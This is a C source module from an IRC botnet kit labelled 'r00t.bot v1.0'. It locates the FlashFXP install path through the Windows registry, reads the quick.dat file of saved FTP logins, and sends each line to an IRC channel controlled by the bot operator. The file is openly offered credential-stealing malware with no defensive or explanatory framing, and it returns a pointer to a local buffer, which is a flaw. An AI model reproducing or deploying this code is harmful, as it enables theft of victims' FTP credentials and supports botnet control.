/*

        _______  _______   __    ___.           __   
_______ \   _  \ \   _  \_/  |_  \_ |__   _____/  |_ 
\_  __ \/  /_\  \/  /_\  \   __\  | __ \ /  _ \   __\
 |  | \/\  \_/   \  \_/   \  |    | \_\ (  <_> )  |  
 |__|    \_____  /\_____  /__|   /\___  /\____/|__|  
               \/ Affix \/       \/   \/ iHack.co.uk
			   
				 r00t.bot v1.0
				 ASN - Affix
				 SkySyn - Affix
				 Connection(recode) - Affix
				 Shellcode - h1dd3n
				 ftpd - Affix

*/

      #include "includes.h"
      #include "functions.h"
      #include "externs.h"

      char *_fipath() {
         char _return[MAX_PATH];
         LONG _ret;
         HKEY _hkey;
         DWORD _siz = 128;

         _ret = fRegOpenKeyEx(HKEY_CURRENT_USER, "Software\\FlashFXP\\3", 0, KEY_READ, &_hkey);
         if(_ret != ERROR_SUCCESS) {
            _ret = fRegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\FlashFXP\\3", 0, KEY_READ, &_hkey);
            if(_ret != ERROR_SUCCESS) return "NO_INSTALL";
            else _ret = fRegQueryValueEx(_hkey, "Install Path", 0, NULL, (LPBYTE)_return, &_siz);      
         }
         else _ret = fRegQueryValueEx(_hkey, "Install Path", 0, /*REG_SZ*/NULL, (LPBYTE)_return, &_siz);
         
         if(_ret != ERROR_SUCCESS) {
            return "NO_INSTALL";
         }
         else {
            fRegCloseKey(_hkey);
            return &_return[0];
         }
      }

      int FlashFXP(int parse, SOCKET sock, char *dest, BOOL notice) {
         char buf[MAX_PATH], line[128];
         FILE *qd;
         strcpy(buf, _fipath());
         if(!strcmp(buf, "NO_INSTALL")) return 0;
         else strcat(buf, "\\quick.dat");
         qd = fopen(buf, "r");
         if(qd == NULL) return 0;
         else {
            if(!parse) {
               fclose(qd);
               return 1;
            }
            else {
               while (fgets(line, 128, qd) != NULL)
               {
                  irc_privmsg(sock, dest, line, notice);
                  Sleep(FLOOD_DELAY);
               }
               fclose(qd);
               return 1;
            }
         }
      } 

